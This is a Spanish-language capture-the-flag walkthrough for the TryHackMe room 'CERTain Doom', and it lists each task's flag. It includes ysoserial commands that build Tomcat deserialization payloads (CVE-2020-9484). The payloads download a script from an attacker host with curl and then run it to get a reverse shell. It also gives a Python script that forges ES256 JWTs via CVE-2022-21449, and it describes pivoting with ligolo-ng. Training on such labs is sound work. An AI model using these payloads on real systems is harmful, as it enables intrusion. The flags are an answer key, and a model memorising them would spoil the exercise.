# CERTain Doom

| **Dificultad** | Hard |
| **Tipo** | CTF |
| **Slug** | `certaindoom` |
| **Link** | [TryHackMe](https://tryhackme.com/room/certaindoom) |
| **Sección** | 03 Level Hard |
| **Fuente** | thmrevenant (GitHub) |
| **Componentes** | Apache Tomcat / CVE-2020-9484 / ysoserial / deserialización / ligolo-ng / Docker / JWT / CVE-2022-21449 |
| **Impacto** | RCE por deserialización en Apache Tomcat (CVE-2020-9484) y forja de un JWT ES256 con Psychic Signatures (CVE-2022-21449) tras pivotar por contenedores Docker con ligolo-ng. |

---

**Contexto:** En CERTain Doom se explota un Apache Tomcat 9 vulnerable a `CVE-2020-9484` (deserialización RCE) para obtener la flag web. Tras pivotar por Docker con ligolo-ng, se accede a una app de biblioteca cuyo backend `library-back` contiene la flag del usuario en un `chat.log`, y la flag secreta se obtiene saltándose un JWT con `CVE-2022-21449` (Psychic Signatures).

## Solucionario

### Task 1: Flag web

**Explicación:** El acceso inicial usa `CVE-2020-9484`: en `/reports` se sube un archivo arbitrario a `/usr/local/tomcat/temp/uploads` y se forja la cookie `JSESSIONID` con un path traversal (`../../../../../temp/uploads/<nombre>`) para que Tomcat deserialice un objeto `.session` subido previamente. Con `ysoserial` (gadget `CommonsCollections2`, Java 11) se encadena en tres fases: `downloadPayload.session` (descarga `payload.sh`), `chmodPayload.session` (`chmod 777`) y `executePayload.session` (`bash payload.sh`), recibiendo una reverse shell y la flag web:

```bash
java -jar ysoserial.jar CommonsCollections2 "curl http://<IP>/payload.sh -o /tmp/payload.sh" > downloadPayload.session
java -jar ysoserial.jar CommonsCollections2 "chmod 777 /tmp/payload.sh" > chmodPayload.session
java -jar ysoserial.jar CommonsCollections2 "bash /tmp/payload.sh" > executePayload.session
# subir cada .session y disparar la cookie JSESSIONID=../../../../../temp/uploads/<nombre>
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the web flag? | `THM{c4T_g07_73H_d353r14L1z4710N_8lu3z}` |

### Task 2: Flag del usuario

**Explicación:** Estamos en un contenedor Docker (el `/etc/hosts` muestra `172.18.0.2` y `172.20.0.4`). Con **ligolo-ng** se monta un túnel hacia las redes `172.18.0.0/16` y `172.20.0.0/16`: aparece la app de biblioteca `172.20.0.2:80` y su backend `172.20.0.3:8080`. En el backend, la cookie `credz` da acceso a `/documents`; con `/documents?author` se listan archivos y `/documents/download/<archivo>` los descarga. El `chat.log` contiene la flag del usuario y revela que el backend usa JWT con verificación vulnerable.

```bash
# con el túnel ligolo activo
curl -H "Cookie: credz=..." "http://172.20.0.3:8080/documents?author=hacker"
curl -H "Cookie: credz=..." "http://172.20.0.3:8080/documents/download/chat.log"
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the user's flag? | `THM{1n73Rn4L_53rV1C35_n07_45_H1dD3N_4S_7H3Y_533|\/|}` |

### Task 3: Flag súper secreta

**Explicación:** `/documents/count` dice 5 documentos y solo se ven 4; fuzzeando `/documents/<ID>` aparece `specs.pdf`, pero solo el usuario `hydra` puede descargarlo. Se fuerza la autenticación de `hydra` forjando un **JWT ES256** explotando `CVE-2022-21449` (Psychic Signatures): el fallo de Java acepta una firma DER con `r=s=0` (`MAYCAQACAQA`), así que el token se firma sin conocer la clave:

```python
import base64
def b64(d): return base64.urlsafe_b64encode(d).rstrip(b"=")
h = b64(b'{"alg":"ES256","typ":"JWT"}')
p = b64(b'{"upn":"hydra","groups":["user"]}')
print((h + b"." + p + b"." + b64(bytes.fromhex("30260201010201000420"))).decode())
# equivalente DER: MAYCAQACAQA para r=s=0
```

Con el token de `hydra` se descarga `specs.pdf`; en el PDF se salta la última página (troll) y en la página 8 aparece la flag súper secreta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the super secret flag? | `THM{H1dD3|\|_1n_Pl41N_516h7}` |

---

**Metodología:**
1. Escaneo de puertos: `80` y `8080` abiertos; el 8080 corresponde a Apache Tomcat 9.
2. En `/reports` hay un formulario de subida de informes (acepta cualquier tipo de archivo) que guarda en `/usr/local/tomcat/temp/uploads`.
3. `CVE-2020-9484`: la cookie `JSESSIONID` puede apuntar a una ruta local relativa; se usa `ysoserial` (con Java 11, la pista "hoy es el número de la suerte 11") para generar payloads de deserialización `CommonsCollections2`.
4. Tres fases: `downloadPayload.session` (descarga `payload.sh` vía curl), `chmodPayload.session` (`chmod 777`) y `executePayload.session` (`bash payload.sh`); cada una se sube retocando la cookie `JSESSIONID` con `../../../../../temp/uploads/<nombre>`.
5. Se recibe la reverse shell en el listener; flag web en el directorio actual.
6. Estamos en un contenedor (`/etc/hosts` muestra `172.18.0.2` y `172.20.0.4`); se monta túnel con ligolo-ng para alcanzar `172.18.0.0/16` y `172.20.0.0/16`.
7. Reconocimiento interno: `172.20.0.2` (app biblioteca, puerto 80) y `172.20.0.3` (backend `library-back`, puerto 8080).
8. Análisis del backend (`/documents`): la cookie `credz` da acceso; con `/documents?author` se listan archivos (`hello.txt`, lista de TODOs y `chat.log`), y con `/documents/download/<archivo>` se descargan.
9. El `chat.log` contiene la flag del usuario y una pista: el backend usa JWT con un algoritmo vulnerable en Java desactualizado.
10. `/documents/count` indica 5 documentos pero solo se ven 4; fuzzeando los IDs con `/documents/<ID>` se encuentra `specs.pdf` (oculto), que solo `hydra` puede descargar.
11. `CVE-2022-21449` (Psychic Signatures): se forja un JWT ES256 con firma `r=s=0` en DER (`MAYCAQACAQA`) y los claims `{upn: hydra, groups: [user]}` → acceso a los archivos ocultos de `hydra` y descarga de `specs.pdf`.
12. En `specs.pdf` se salta la última página (troll) y en la página 8 aparece la flag súper secreta.

**Learning chain:** `nmap → Tomcat 9 en :8080 → CVE-2020-9484 (ysoserial + JSESSIONID path traversal) → reverse shell → web flag → Docker (/etc/hosts) → ligolo-ng → library-back (172.20.0.3:8080) → credz cookie → /documents exfiltration → chat.log → user flag → CVE-2022-21449 (JWT ES256 r=s=0) → specs.pdf (página 8) → super secret flag`

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1105 (Ingress Tool Transfer), T1059 (Command and Scripting Interpreter), T1078 (Valid Accounts), T1068 (Exploitation for Privilege Escalation)

**Fuente:** [TryHackMe - CERTain Doom](https://tryhackme.com/room/certaindoom)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
